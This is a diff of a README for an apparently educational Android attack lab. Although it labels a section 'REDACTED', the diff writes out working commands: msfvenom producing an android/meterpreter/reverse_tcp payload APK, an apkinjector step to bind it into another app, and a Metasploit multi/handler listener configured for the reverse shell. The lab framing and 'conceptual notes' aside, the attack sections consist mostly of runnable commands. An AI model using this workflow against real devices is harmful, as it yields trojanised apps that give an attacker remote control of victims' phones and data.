@@ -19,14 +19,22 @@ A polished, benign Android WebView sample, build instructions, lab artifacts, an
 
 ## Table of Contents
 
-1. [About](#about)
-2. [Disclaimer & Ethics](#disclaimer--ethics)
-3. [Prerequisites (exact commands)](#prerequisites-exact-commands)
-4. [Build the example APK (exact commands)](#build-the-example-apk-exact-commands)
-5. [Payload / binding / analysis (redacted)](#payload--binding--analysis-redacted)
-6. [Recommended isolated workflow](#recommended-isolated-workflow)
-7. [Safety & hardening recommendations (MUST read)](#safety--hardening-recommendations-must-read)
-8. [Demo tips for conferences](#demo-tips-for-conferences)
+- [F3‑MANTA — Mobile Attack \& Network Testing Arena (Educational Sandbox)](#f3manta--mobile-attack--network-testing-arena-educational-sandbox)
+  - [TL;DR](#tldr)
+  - [Table of Contents](#table-of-contents)
+  - [About](#about)
+  - [Disclaimer \& Ethics](#disclaimer--ethics)
+  - [Prerequisites (exact commands)](#prerequisites-exact-commands)
+  - [Build the example APK (exact commands)](#build-the-example-apk-exact-commands)
+  - [Payload creation, binding, and runtime listener — **REDACTED**](#payload-creation-binding-and-runtime-listener--redacted)
+    - [Example: prepare the analysis lab and tools](#example-prepare-the-analysis-lab-and-tools)
+    - [Example: create a payload artifact](#example-create-a-payload-artifact)
+    - [Example: bind or inject payload into APK](#example-bind-or-inject-payload-into-apk)
+    - [Example: inspect modified smali/manifest](#example-inspect-modified-smalimanifest)
+    - [Example: runtime listener / handler](#example-runtime-listener--handler)
+  - [Recommended isolated workflow](#recommended-isolated-workflow)
+  - [Safety \& hardening recommendations (MUST read)](#safety--hardening-recommendations-must-read)
+  - [Demo tips for conferences](#demo-tips-for-conferences)
 
 ---
 
@@ -122,17 +130,18 @@ msfconsole --version
 ### Example: create a payload artifact
 ```
 cd ../Lab
+```
+```
 msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-system-ip> LPORT=<port:4444> -o payload.apk -f raw
-
 ```
 **Conceptual note:** In an authorised lab, this step generates a test payload. 
 
 ### Example: bind or inject payload into APK
 ```
-
 chmod +x ./apkinjector
+```
+```
 ./apkinjector
-
 ```
 **Conceptual note:** Injection merges payload code with a target APK. The public repo omits binding recipes — present this conceptually or use inert artifacts included in `Lab/`.
 
@@ -142,8 +151,7 @@ chmod +x ./apkinjector
 ```
 If you can’t find the .smali file path, run the command below to list matching files and then enter the correct path manually.
 ```
-# from the project root, list all .smali files
-### find /tmp/original -type f -name 'MainActivity.smali' -print
+find /tmp/original -type f -name 'MainActivity.smali' -print
 ```
 
 **Conceptual note:** Analysts would inspect `smali/` changes and manifest entries with static analysis tools inside the isolated lab to find tampering indicators.
@@ -151,9 +159,17 @@ If you can’t find the .smali file path, run the command below to list matching
 ### Example: runtime listener / handler
 ```
 msfconsole -q
+```
+```
 use exploit/multi/handler
+```
+```
 set payload android/meterpreter/reverse_tcp
+```
+```
 set LHOST <your-system-ip>
+```
+```
 set LPORT <port:4444>
 ```
 
